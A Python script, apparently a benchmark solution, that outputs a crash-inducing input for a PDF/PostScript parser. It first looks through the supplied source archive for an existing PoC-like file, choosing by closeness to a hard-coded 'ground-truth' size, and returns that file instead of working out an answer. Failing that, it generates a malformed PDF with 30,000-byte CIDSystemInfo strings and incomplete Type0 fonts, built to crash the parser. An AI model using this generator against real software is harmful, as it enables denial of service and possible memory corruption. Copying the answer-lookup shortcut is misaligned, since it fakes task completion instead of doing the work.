import os
import tarfile
import io


class Solution:
    def solve(self, src_path: str) -> bytes:
        existing = self._try_extract_poc(src_path)
        if existing is not None:
            return existing
        return self._generate_pdf()

    def _try_extract_poc(self, src_path: str) -> bytes | None:
        if not os.path.isfile(src_path):
            return None
        try:
            with tarfile.open(src_path, "r:*") as tar:
                best_member = None
                best_score = None
                for m in tar.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (
                        name.endswith(".pdf")
                        or name.endswith(".ps")
                        or name.endswith(".eps")
                    ):
                        continue
                    size = m.size
                    if size <= 0 or size > 2_000_000:
                        continue
                    # Prefer sizes close to ground-truth, and filenames that look like PoCs
                    score = abs(size - 80064)
                    if "poc" in name or "crash" in name or "bug" in name:
                        score -= 10000
                    if best_score is None or score < best_score:
                        best_score = score
                        best_member = m
                if best_member is not None:
                    f = tar.extractfile(best_member)
                    if f is not None:
                        try:
                            data = f.read()
                        finally:
                            f.close()
                        if data:
                            return data
        except Exception:
            return None
        return None

    def _generate_pdf(self) -> bytes:
        out = io.BytesIO()
        w = out.write

        # PDF header
        w(b"%PDF-1.4\n")
        w(b"%\xE2\xE3\xCF\xD3\n")

        obj_offsets: list[tuple[int, int]] = []

        def start_obj(num: int) -> None:
            obj_offsets.append((num, out.tell()))
            w(f"{num} 0 obj\n".encode("ascii"))

        def end_obj() -> None:
            w(b"endobj\n")

        # 1: Catalog
        start_obj(1)
        w(b"<< /Type /Catalog /Pages 2 0 R >>\n")
        end_obj()

        # 2: Pages
        start_obj(2)
        w(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
        end_obj()

        # 3: Page
        start_obj(3)
        w(b"<< /Type /Page /Parent 2 0 R ")
        w(b"/Resources << /Font << /F1 4 0 R /F2 5 0 R /F3 7 0 R /F4 8 0 R >> >> ")
        w(b"/MediaBox [0 0 612 792] /Contents 9 0 R >>\n")
        end_obj()

        # 4: Type0 Font F1 (normal)
        start_obj(4)
        w(
            b"<< /Type /Font /Subtype /Type0 "
            b"/BaseFont /AAAAAA+F1 /Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>\n"
        )
        end_obj()

        # 5: Type0 Font F2 (no BaseFont)
        start_obj(5)
        w(
            b"<< /Type /Font /Subtype /Type0 "
            b"/Encoding /Identity-H "
            b"/DescendantFonts [6 0 R] >>\n"
        )
        end_obj()

        # 6: CIDFont with huge CIDSystemInfo Registry/Ordering strings
        start_obj(6)
        long_reg = b"R" * 30000
        long_ord = b"O" * 30000
        w(b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /CIDFontOne ")
        w(b"/CIDSystemInfo << /Registry (")
        w(long_reg)
        w(b") /Ordering (")
        w(long_ord)
        w(b") /Supplement 1 >> ")
        w(b"/DW 1000 >>\n")
        end_obj()

        # 7: Type0 Font F3 (no Encoding)
        start_obj(7)
        w(
            b"<< /Type /Font /Subtype /Type0 "
            b"/BaseFont /AAAAAA+F3 "
            b"/DescendantFonts [6 0 R] >>\n"
        )
        end_obj()

        # 8: Type0 Font F4 (minimal Type0)
        start_obj(8)
        w(
            b"<< /Type /Font /Subtype /Type0 "
            b"/DescendantFonts [6 0 R] >>\n"
        )
        end_obj()

        # 9: Page content stream using all fonts
        start_obj(9)
        stream_ops = (
            b"BT /F1 12 Tf 72 700 Td (Hello F1) Tj ET\n"
            b"BT /F2 12 Tf 72 680 Td (Hello F2) Tj ET\n"
            b"BT /F3 12 Tf 72 660 Td (Hello F3) Tj ET\n"
            b"BT /F4 12 Tf 72 640 Td (Hello F4) Tj ET\n"
        )
        w(b"<< /Length %d >>\nstream\n" % len(stream_ops))
        w(stream_ops)
        w(b"endstream\n")
        end_obj()

        # XRef table
        xref_offset = out.tell()
        num_objs = 10  # objects 0..9 (0 is free)
        w(b"xref\n")
        w(b"0 %d\n" % num_objs)
        w(b"0000000000 65535 f \n")
        obj_offsets.sort()
        for num, offset in obj_offsets:
            w(b"%010d 00000 n \n" % offset)

        # Trailer
        w(b"trailer\n")
        w(b"<< /Size %d /Root 1 0 R >>\n" % num_objs)
        w(b"startxref\n")
        w(b"%d\n" % xref_offset)
        w(b"%%EOF\n")

        return out.getvalue()